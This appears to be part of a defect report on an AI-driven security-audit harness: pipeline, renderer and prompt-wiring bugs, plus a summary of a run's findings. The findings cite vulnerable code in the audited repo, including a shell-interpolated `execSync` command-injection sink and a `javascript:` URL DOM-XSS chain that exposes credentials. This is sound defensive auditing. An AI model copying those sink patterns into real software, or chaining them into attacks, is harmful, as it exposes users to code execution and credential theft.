`sast_plan.codeql.reason` string was populated in this run precisely so it could be surfaced;
nothing reads it.

---

## D19 — The Triage `Status` column prints `runtime_disposition` values, contradicting on-disk `status`

**Severity:** Medium
**Component:** `<HELPERS>/sec_overlay/report.py`, `<HELPERS>/sec_overlay/redteam.py`

`report.md`'s Triage `Status` column prints `needs-runtime` for `AUTHN-0006` (report.md:16)
and `PROMPT-INJECTION-0005` (report.md:60). Neither value is a `status` — both findings are
`status: needs-deployment-testing` with `runtime_disposition: static-settled` on disk. The
rows then instruct the reader to "run redteam-plan directive" for findings the pipeline itself
declared statically settled.

`redteam-plan.md` compounds it: its header says the inclusion set is `needs-runtime findings`,
yet `AUTHN-0006` (static-settled) appears at priority 10 with a full directive, and its
`Static-settled` section counts 1 finding where disk has 3.

Note this is partly a *consequence* of the deliberate `wants_runtime()` OR-predicate
(`agents/redteam.md:32-42`), which is correct by design — inclusion is the safe default. The
defect is the rendering, which should print `status` in a Status column and surface
`runtime_disposition` as its own field rather than overloading one column with two vocabularies.

---

## D20 — `artifact-review`'s `render_stale` remedy cannot fix a renderer defect; re-render is a no-op

**Severity:** Medium (process/design — the final adversary has no effective remedy for what it
most often finds)
**Component:** `<SKILL>/agents/artifact-review.md` § Output safety contract

The `artifact-review` phase returned `verdict: "re-render"` with
`forced_rerender: ["C-CMDI-0004", "OPEN-REDIRECT-CLIENT-0001"]`. The orchestrator re-ran
`report`. **Nothing changed** — byte-for-byte the same defects:

| Check after re-render | Result |
|---|---|
| `C-CMDI-0004` rendered status | still `confirmed` (disk: `fixed`) |
| "apply fix (§ below)" pointer | still dangling, still 0 `diff --git` in report.md |
| absolute local paths | still 1,299 lines |
| false "no terminal finding" rows | still 15 |

The phase's three permitted remedies are: downgrade a severity, set `render_stale: true` to
force a re-render, or add an `open_questions` entry. But the defects a report adversary
actually finds are overwhelmingly *renderer* bugs, not stale data — and re-running a buggy
renderer reproduces the bug. The safety contract gives the final adversary no way to escalate
"the renderer is wrong", so a genuinely correct `re-render` verdict resolves to nothing.

Suggested fix: add a fourth outcome — a `renderer_defect` verdict that fails the phase loudly
(or writes a `kb/gates/artifact-review.json` the `postflight` phase treats as a hard error),
so a renderer bug surfaces as a run failure rather than an ignored re-render request.

---

## D21 — Model-family independence is hardcoded to specific model names, so it inverts when the operator picks different models

**Severity:** High (silently destroys the independence the rule exists to create)
**Component:** `<SKILL>/agents/trace.md:7`, `<SKILL>/agents/artifact-review.md:5-7`
(contrast `<SKILL>/agents/validate.md:8-10`, which gets it right)

### What happened

Three phases require model-family diversity, but two of them state it as a literal model name
rather than as a relation to the previous phase:

- `trace.md:7` — *"Run on opus (a DIFFERENT family than the sonnet investigator)."*
- `artifact-review.md:5-7` — *"You run on a DIFFERENT, stronger model family than the producers
  (opus vs the sonnet producers)."*
- `validate.md:8-10` — *"You must run on a DIFFERENT model family than the investigator that
  produced these findings"* ← correct, expressed relatively.

In this run the investigators ran on **Opus** (the session default) and the validators on
Sonnet. Following `trace.md:7` literally would therefore have put the reachability gate on
**the same family that wrote the reachability claims it exists to check** — the exact opposite
of the intent. The orchestrator noticed and deliberately ran the tracers on Sonnet instead,
flagging the deviation to each agent.

An operator who follows the prompt literally, or an automated driver that reads the model name
out of the prompt, gets zero independence and no warning.

### Impact

The independence requirement is one of the harness's strongest quality mechanisms — in this
run the Sonnet validators caught real errors in the Opus investigators' work, and the Opus
artifact reviewer caught five defects the orchestrator had missed. A silently-inverted family
assignment would have removed that check while appearing to satisfy it.

### Suggested fix

Express every diversity requirement relatively, as `validate.md` already does: "a different
model family than the phase that produced these findings". If the harness knows which model
ran each phase, record it in `state.json` per stage and have the driver assert the constraint
mechanically rather than trusting prose.

---

## D22 — The `prove` and `selfscore` phases silently self-complete, producing no artifact and no output

**Severity:** Medium (a phase that records itself done without running is indistinguishable
from one that ran and found nothing)
**Component:** `<HELPERS>/sec_overlay/driver.py` PHASE_TABLE entries for `prove` and
`selfscore`

### What happened

`prove` is listed in `PHASE_TABLE` as an **agent** phase. The driver never emitted a
`NEXT AGENT PHASE: prove` block; it went straight from `redteam` to `artifact-review`. Yet
`prove` is recorded complete in `state.json` and has a receipt:

```json
// kb/receipts/prove.json
{"phase": "prove", "stdout": "", "artifacts": [], "counts": {...}}
```

`selfscore` behaves the same way — `kb/receipts/selfscore.json` is byte-identical in shape,
`"artifacts": []`, empty stdout. No self-score file exists anywhere in the workspace
(`find . -iname '*selfscore*'` returns only the receipt). The only visible trace of the phase
is a `## Run economics` section in `report.md`.

### Impact

Two of 28 phases contributed nothing and said nothing about it. `prove` may be legitimately
opt-in (preflight refers to "the opt-in prove lane" and reports its toolchains separately),
but if so the receipt should say `skipped: not enabled` rather than presenting an empty
success. As written, a reader of `state.json` sees 28/28 complete and reasonably infers 28
phases ran.

Related: the `## Run economics` section that `selfscore` appears to feed reports
`**Estimated cost:** $0.0000` and lists wall-clock for the ten deterministic phases only. The
eleven agent phases — which are the overwhelming majority of the work and cost — are absent,
because they run outside the harness. A cost line of `$0.0000` on a run of this size is worse
than no cost line.

### Suggested fix

Emit `{"phase": ..., "skipped": true, "reason": "..."}` for any phase that does not execute,
and have `postflight` surface skipped phases. Either drop the cost estimate or label it
"deterministic phases only".

---

## D23 — `artifact-review` audits an `impact` field that no producer phase is ever asked to write

**Severity:** Medium (a review step with nothing to review on 69% of findings)
**Component:** `<SKILL>/agents/artifact-review.md` Procedure step 2 vs the producer prompts

`artifact-review.md` Procedure step 2 says:

> **Impact honesty.** Confirm each shipping finding's `impact` describes a real consequence
> traceable to the dataflow — not a restatement of the attack class.

The string `impact` appears **zero** times in every producer prompt that runs in the standard
table — `investigate.md`, `validate.md`, `trace.md`, `redteam.md`, `critic.md`, `judge.md`,
`patch.md` (verified by grep across all seven). It appears only in `bugchain.md` and
`review-file.md`, neither of which is in `PHASE_TABLE`, and in the reviewer that audits it.

Result in this run: **37 of 54 shipping findings have no `impact` field at all**, including
four of the six highest-risk rows (`XSS-0001`, `XSS-0002`, `AUTHN-0007`, `CRYPTO-0002`, all
risk 8). The renderer falls back to `message`, which is honest, but step 2 of the final
adversarial review has nothing to audit for those 37.

This is the same prompt-vs-contract drift family as D1/D9/D11/D12, in the opposite direction:
there the prompt named a field the model rejected; here the reviewer audits a field no prompt
requests.

**Fix:** add `impact` to the investigate/validate output schema (or drop step 2). The same
consistency test proposed in D9 catches it.

---

## D24 — The Triage table truncates a finding's message at 100 characters, cutting the word that carries the severity

**Severity:** Medium (the reader's first encounter with a finding can lose its actual meaning)
**Component:** `<HELPERS>/sec_overlay/report.py` Triage-row renderer

The Triage row for the audit's most serious unconfirmed finding renders as:

```
| OPEN-REDIRECT-CLIENT-0001 | 5 | changeRoute() hands ANY absolute URL -- any scheme, including… | coreui/workbench-router/src/createRouter.ts:144 | needs-runtime | ... |
```

The message on disk continues:

```
... any scheme, including javascript: -- straight to window.location.assign with no scheme
allowlist, and a Feed notification's server-supplied link.url reaches it. Sibling class note:
the javascript: branch is a dom-xss primitive ...
```

The truncation lands **immediately before the word `javascript:`** — the single token that
distinguishes "open redirect" (the finding's class name, medium/risk 5) from "DOM-XSS in the
router every workbench shares". A reader scanning the Triage table sees a mid-tier open-redirect
and has no signal to open the detail page.

This compounds D19's mis-titling problem: the class name understates the finding, and the
truncation removes the one clue that it does.

**Fix:** truncate on a word boundary and prefer the `impact` field (D23) over `message` for the
summary cell; or raise the cap and let the row wrap.

---

## D25 — TOOL_TRUST's mitigation is insufficient for claims of ABSENCE, and a subagent shipped a false "fabricated" verdict because of it

**Severity:** Medium (a wrong negative from a verification phase is more damaging than a wrong
positive from a discovery phase)
**Component:** `<SKILL>/references/prompt-constants.md` § TOOL_TRUST, applied in
`validate.md` / `artifact-review.md`

### What happened

TOOL_TRUST already warns that the host shell may rewrite piped output, and it was right — this
run reproduced it twice. Piped `rg` rendered the identifier `useNavigateToLink` as `l` and
`sanitizeForPrompt` as `n`, in output the orchestrator was reading to locate code.

The failure that matters: the independent validator (`val-render-ai`) reported that repo-wide
grep found **zero** hits for `sanitizeForPrompt` and `ApplicablePatches`, and concluded the
finding's comparison to a sibling control was *"uncorroborated/likely fabricated"*. Both
identifiers exist — `sanitizeForPrompt` is defined at
`internal/experience-atlas-viz/src/ApplicablePatches/cellValue.ts:78-83` and called twice in
`ApplicablePatches.tsx`; `ApplicablePatches` is an entire directory. The orchestrator caught
it only by independently re-running the search and then Reading the file.

Had that verdict shipped, the report would have accused a correct finding of fabrication AND
lost the strongest framing of three prompt-injection findings — the control exists in-repo and
is simply not applied at the reported sites, which is a much better finding than "no control
exists".

### Why TOOL_TRUST doesn't cover this

TOOL_TRUST's rule is asymmetric: *"For a finding's exact bytes … use the Read tool"*. That
protects a claim of PRESENCE (quote the sink line correctly). It says nothing about a claim of
ABSENCE, where the failure mode is a mis-scoped or mangled search returning empty and being
believed. An empty `rg` result has no bytes to Read.

**Fix:** add an explicit clause — a claim that something does NOT exist must be grounded in
`ast-grep`, the structural index, or an explicitly-stated search scope, and must never rest on
a bare piped `rg` returning zero. Mirror the wording already present for absence checks in the
same block ("An absence check inverts that risk… Before you cite an absence, run the rule
against a site you know carries the safe option"), which currently applies only to semgrep
absence rules and should be generalised to any negative claim.

---

## D26 — Half the agent prompts are orphaned; `context-ingest` (Phase C1) is never wired in, so no phase ever reads the repo's own design documents

**Severity:** High (an entire designed input to the scan is permanently absent, and wired code
depends on it)
**Component:** `<HELPERS>/sec_overlay/driver.py` `PHASE_TABLE` vs `<SKILL>/agents/`

### What happened

The target repo contains an `openspec/` directory — 16 files across three in-flight
spec-driven change proposals (`proposal.md`, `design.md`, `tasks.md`, `specs/*.md` each). Two
of the three describe **Atlas** design contracts, and Atlas was by far the richest attack
surface in this audit (`MCP-TRUST-INHERITANCE-0001`, five prompt-injection findings,
`EXPR-EVAL-RCE-0001`).

Nothing in the audit read any of it. Verified: zero mentions of `openspec` in
`kb/route-census.json`, `kb/scan-profile.json`, `kb/coverage-ledger.json`, `report.md`, or any
of the 278 finding records.

### Why — and it is not simply "recon excluded `*.md`"

`agents/recon.md:24-29` correctly instructs recon to exclude `*.md` from greps as noise
hygiene. That is right for finding sinks. The compensating mechanism is supposed to be a
separate phase, and it exists as a prompt:

> `agents/context-ingest.md:1-4` — "# Context-Ingest Agent (Phase C1). You distill a repo's own
> security-relevant context into structured `context.json` that DRIVES the scan."

And `recon.md:12-13` explicitly consumes it:

> "`{{WORKSPACE}}/kb/context.json` if present: C1 context leads (trust-tagged) inform — never
> override — evidence-based surface selection; a doc claim is not an indicator."

**`context-ingest` is not in `PHASE_TABLE`.** `kb/context.json` was never produced, so recon's
`if present` is never satisfied and the channel is dead in every standard run.

### The wider problem

Of the 29 prompts in `agents/`, only 14 are wired into `PHASE_TABLE`
(`architecture, artifact-review, critic, factcheck, investigate, judge, patch, postflight,
prove, recon, redteam, threat-model, trace, validate`). The other 14 are unreachable from
`drive()`:

`bugchain`, `context-adversary`, `context-ingest`, `correlate-combiner`,
`cross-repo-adversary`, `phase-adversary`, `recall-adversary`, `redteam-adversary`,
`review-file`, `review-filter`, `review-plan`, `tune-config`, `validate-fix`, `variant-hunt`.

Some are legitimately for other entrypoints — `correlate-combiner` and `cross-repo-adversary`
belong to the multi-repo `correlate` lane, and `review-*` to the review lane. But at least
three are referenced by code or prompts that DO run:

1. **`context-ingest`** — consumed by `recon.md:12-13`, never produced (above).
2. **`validate-fix`** — `<HELPERS>/sec_overlay/verify.py:380` writes the history note
   *"status/verification as validate-fix left them for human review"*, referring to a phase
   that cannot have run.
3. **`bugchain`** — dedicated cross-finding chain analysis. This run's single most serious
   result was a chain (`OPEN-REDIRECT-CLIENT-0001` supplying the script-execution precondition
   that `CONTEXT-BLEED-0001` requires). The orchestrator had to find and record it by hand
   because the phase built for exactly that is unwired.

### Impact

Three distinct losses in one run: no document-derived context for recon/architecture/threat
model; a verify note referencing a phase that never ran; and cross-finding chain analysis done
manually or not at all. None of these announce themselves — a `28/28 phases complete` run looks
total.

### Suggested fix

1. Wire `context-ingest` in ahead of `recon` (it is labelled C1, so the intended position is
   already documented), or delete the `context.json` read from `recon.md` so the contract stops
   promising an input that never arrives.
2. Wire `bugchain` after `trace` and before `report`.
3. Add a startup assertion that every prompt in `agents/` is either in a phase table or on an
   explicit `_UNWIRED_BY_DESIGN` allowlist with a one-line reason. This is the same class of
   contract-drift as D1/D9/D11/D12/D23 and the same consistency test could cover it.

---

## D13 — SEVERITY_PRECONDITION penalises thoroughness: disjunctive precondition lists deflate severity

**Severity:** Medium (methodology, not implementation — but it systematically mis-ranks findings)
**Component:** `<SKILL>/references/prompt-constants.md` § SEVERITY_PRECONDITION

### What happened

Two findings of the same class and comparable real-world difficulty received the same final
severity only by accident, because one was documented more thoroughly than the other.

- `XSS-0001` (stored XSS via `ThemedBodyContent.tsx:24`) listed **2** preconditions:
  an authoring-privileged user writes the HTML, and a second user views it.
- `XSS-0003` (stored XSS via `NotificationEditForm.tsx:127`) listed **5**, because the
  investigator documented *two independent routes* to the same sink in one list: a console
  route (2 preconditions, structurally identical to XSS-0001's) plus an Atlas agent route
  (3 more).

Under the rule, 2 preconditions is the medium band and 3+ is the low band. So the finding
with the *better* analysis landed a band lower and needed the one-step threat-model raise to
get back to parity.

### Why it happens

SEVERITY_PRECONDITION says:

> enumerate everything that must hold for exploitation (auth state, specific config, feature
> flag, local access, a prior primitive). Then derive severity as the LOWER of two bands:
> (a) precondition COUNT — 0 → high, 1–2 → medium, 3+ → low

"Everything that must hold" is conjunctive. But an investigator who finds two alternative
attack paths naturally records both in the one `preconditions` array, and there is no field
for expressing "route A OR route B". The count then treats alternatives as if they were
additional obstacles, so **each extra route discovered makes the finding score as less
severe**. The rule rewards the investigator who stops after the first path.

The same defect applies to `runtime_dependent` findings: a precondition recorded as "not
verifiable from this repo" is epistemic honesty, but it counts identically to a real
obstacle and pushes severity down.

### Impact

Systematic mis-ranking in the direction that matters least safely: the most thoroughly
analysed findings are the most under-rated. It is invisible in a single finding — it only
shows up when two findings of one class are compared side by side, which no phase in the
pipeline currently does.

### Suggested fix

Pick one:

1. Count only the **minimum conjunctive set across routes** (i.e. the cheapest path's
   preconditions), which is what an attacker actually faces. This is the smallest change and
   matches attacker reality.
2. Add an explicit structure — `preconditions: [{route: "console", requires: [...]}, ...]` —
   and derive the band from the cheapest route.
3. Keep the count but exclude preconditions tagged as unverified-from-repo from the tally,
   so honesty about scope is not penalised.

Option 1 is the lazy correct fix. Whichever is chosen, state in the prompt that alternative
routes must NOT be concatenated into one conjunctive list, because that instruction is
currently absent and the natural behaviour is wrong.

### Observed in this run

The judge phase upheld XSS-0003 at medium specifically to counteract this artifact, and
recorded the reasoning. That correction was manual and would not survive a pass that
trusted the mechanism.

---

## D10 — Derived-diagram SHA must be computed by hand and goes stale silently on the authoring side

**Severity:** Low
**Component:** `<SKILL>/agents/threat-model.md:33-35`, `<HELPERS>/sec_overlay/diagram_gate.py:28-41`

`dfd.mmd` and each attack sequence must carry
`%% derived-from: <file> sha256:<hex>`. The threat-model prompt has the agent shell out to a
`hashlib` one-liner and paste the digest in by hand.

The gate side is sound — `_provenance` (`diagram_gate.py:28-41`) recomputes and reports
`derived-from sha stale`. The authoring side is the friction: any later edit to
`container-diagram.mmd` invalidates every derived diagram, with no tool to re-stamp them.
On a multi-pass audit that is a guaranteed manual step.

This run worked around it by gating each diagram manually before advancing:

```python
from sec_overlay.diagram_gate import check_diagram
check_diagram(ws/'threat-model/dfd.mmd', 'dfd', source=ws/'architecture/container-diagram.mmd')
```

That call is not documented in either agent prompt, though it is the fastest way to avoid a
gate rejection round-trip.

**Suggested fix:** ship a `restamp_derived(path, source)` helper, and mention
`check_diagram` in the architecture and threat-model prompts as a pre-submit self-check.

---

## Summary table

| ID | Severity | Component | One-line |
|---|---|---|---|
| D1 | Blocker | `profile.py:52-70`, `agents/recon.md:75-78`, `scan-profile.schema.json` | Prompt orders recon to write `dependency_sinks`; dataclass raises `TypeError` on it |
| D2 | Blocker | `codeql.py:18-48` | `"setup" in text` matches the glob `**/jest.setup.*`; CodeQL refused on a benign config |
| D3 | High | `preflight.py:17-23`, `:44-48`, `:171-209` | No vendored semgrep rules ship; wrong `--rules-dir` reports a false OK; exit code observed as 0 |
| D4 | Medium | `githist.py:13-16` | Unanchored `RCE`/`vuln`/`security` keywords return mostly feature commits |
| D5 | Medium | `prefilter.py:65`, `:311`; `driver.py:102` | Backend failure surfaces as a raw traceback with a duplicated reason string |
| D6 | Low | `run.py:230-252` | `advance()` prints nothing; no confirmation a phase closed |
| D7 | Low | `commands/audit.md` | `cd plugins/sec-overlay/…` resolves from no plausible CWD; three install candidates exist |
| D8 | Low | `pyproject.toml` + `uv run` | `.venv` created inside the plugin install tree |
| D9 | Low | `recon.md` vs schema vs dataclass | No test binds prompt-named outputs to the profile contract (root cause of D1) |
| D10 | Low | `threat-model.md:33-35`, `diagram_gate.py:28-41` | Derived-diagram SHA is hand-stamped; no re-stamp helper; `check_diagram` undocumented |
| D11 | Blocker | `investigate.md:235-239` vs `driver.py:274` | Prompt mandates `cls: "logic-chain"`; findings gate rejects it as non-canonical |
| D12 | Low | `investigate.md:212-221` vs `models.py` | Four documented attack-context fields aren't declared on `Finding`; ~28 unknown-key warnings per load |
| D13 | Medium | `prompt-constants.md` § SEVERITY_PRECONDITION | Precondition count is conjunctive, so documenting alternative attack routes *lowers* severity — the rule penalises thoroughness |
| D14 | High | `report.py` | The one machine-verified patch is absent from `report.md`; status renders stale as `confirmed` not `fixed`; "(§ below)" points at a nonexistent section |
| D15 | High | `report.py` + `route-census` | Coverage section is 736,691 of 757,225 bytes (**97.3%**) of the report; 313+ rows are test/fixture/mock files, many aren't routes at all |
| D16 | High | `report.py` | `Coverage completeness` asserts "no terminal finding" for 13 classes that shipped ~40 findings — a false claim about the run's own output |
| D17 | Medium | `report.py` | 3,897 absolute local paths in `report.md`, violating the harness's own PATH_BASE rule; SARIF and finding pages are clean |
| D18 | High | `report.py` | Report never mentions CodeQL (0 matches) or any other coverage caveat, so the reader cannot calibrate why 53/54 are unconfirmed |
| D19 | Medium | `report.py`, `redteam.py` | Triage `Status` column prints `runtime_disposition` values, contradicting on-disk `status` |
| D20 | Medium | `agents/artifact-review.md` | `render_stale`/re-render is the phase's only remedy for render defects, and re-running a buggy renderer is a verified no-op |
| D21 | High | `trace.md:7`, `artifact-review.md:5-7` | Model-family independence hardcoded to literal model names; inverts silently when the operator's models differ from the assumed ones |
| D22 | Medium | `driver.py` PHASE_TABLE (`prove`, `selfscore`) | Both phases record themselves complete with `"artifacts": []` and no output; `$0.0000` cost line counts deterministic phases only |
| D23 | Medium | `artifact-review.md` step 2 vs producer prompts | Reviewer audits an `impact` field that zero producer prompts request; 37/54 findings lack it |
| D24 | Medium | `report.py` Triage renderer | 100-char message truncation cut immediately before `javascript:`, hiding the DOM-XSS angle of the top finding |
| D25 | Medium | `prompt-constants.md` § TOOL_TRUST | Rule protects claims of presence, not absence; a mis-scoped grep produced a false "likely fabricated" verdict against a correct finding |
| D26 | High | `driver.py` PHASE_TABLE vs `agents/` | 14 of 29 agent prompts are unwired, incl. `context-ingest` (Phase C1) which `recon.md:12-13` consumes — so no phase reads the repo's design docs (`openspec/` went entirely unread) |

**Pattern across D1, D9, D11, D12:** four separate instances of agent prompts naming outputs
the Python contract does not model. Two were blockers. A single consistency test binding
prompt-named output fields and `cls` values to `ScanProfile` / `Finding` / the canonical class
list would have caught all four before a run ever started. This is the highest-leverage fix
in this report.

---

## Suggested fix order

1. **D2** (CodeQL guard) — one regex. Measured cost: 53 confirmations and ~50 machine-verified
   patches in a single run. Nothing else on this list comes close.
2. **One consistency test** closing D1, D9, D11, D12, and D23 together. Four of these were
   the same bug — a prompt naming an output the contract does not model — and two were
   blockers. `tests/test_references_caps.py` is the existing precedent for the test shape.
3. **D15 + D16 + D17 + D18** (the report renderer). These are independent bugs in one file,
   and together they are why the report is the run's weakest artifact.
4. **D3** (ship or hard-gate the vendored semgrep rules). Without them a TS/JS target gets
   near-zero SAST and is told everything is fine.
5. **D21** (relative model-family requirements). Cheap, and it protects the mechanism that
   caught the most real errors in this run.

Everything else is worth doing but changes no outcome on its own.

---

## What the run produced

Written to `/Users/christopher/Documents/Code/ufe/.sec-overlay/ufe-be891807/`:

- `kb/scan-profile.json` — 15 attack classes with `file:line` evidence, 9 subsystems, 34 entrypoints
- `architecture/` — arc42 + context/container/component/sequence diagrams (all passed `diagram_gate`)
- `threat-model/` — STRIDE + PASTA + LINDDUN, 12 CVSS v4.0-scored rows, 15-row hunt list, DFD, attack sequence
- `findings/` — 54 shipping records with reachability chains, 4 `git apply --check`-clean patches
- `redteam-plan.md` — 26 runtime directives, 27 below-bar gaps, 1 static-settled
- `report.md`, `report.sarif` — see D14-D19 before trusting `report.md`; the SARIF is clean
- `kb/investigate-coverage-notes.md` — the seven coverage caveats the report omits (D18)

**Security results worth acting on regardless of the tooling defects:**

- `C-CMDI-0004` (**fixed, verified**) — CI command injection: a PR-controlled locale filename
  reaches `execSync(\`git show ${ref}:${relativePath}\`)` via the `pull_request`-triggered
  translation check. Patched to `execFileSync` with an argv array.
- `OPEN-REDIRECT-CLIENT-0001` — DOM-XSS in the shared CoreUI router (feed response field →
  `javascript:` URL → `window.location.assign`), verified reachable across five hops. Composes
  with `CONTEXT-BLEED-0001` (plaintext RDP credentials released to any same-origin script on an
  unauthenticated `{type:'ready'}` message).
- A recurring pattern: a control exists in-repo and is not applied on the reported path —
  DOMPurify (`HtmlSanitizer.ts:29`) absent from 3 XSS sinks, `sanitizeForPrompt`
  (`cellValue.ts:78`) absent from 3 THR prompt sites, the GraphQL operation-type guard
  (`useGraphQLTableQuery.ts:67`) absent from the query editor.

**Orchestrator errors made and retracted during the run** (recorded in finding history, listed
here because they bear on how much weight to give any single phase's output):

1. Asserted a chain between `AUTHN-0006` and `AUTHN-0007`; the trace phase disproved it —
   `useResetManifestUrlBanner` builds its own axios client and never touches
   `createAxiosInstance`. Retracted in `AUTHN-0006` history.
2. Hypothesised the two prototype-pollution findings were the same shallow pattern as 10
   correctly-rejected siblings; the validator showed the sink is `lodash/set` with a
   user-controlled PATH, which is the genuinely recursive shape.
3. Proposed raising `XSS-0003` on the strength of the chain finding; withdrawn because the
   chain carries more preconditions than the direct route, so per SEVERITY_PRECONDITION it
   cannot inflate it.

All three were caught by independent verification rather than self-review, which is the
strongest available argument for keeping the multi-model independence requirements (D21) intact.
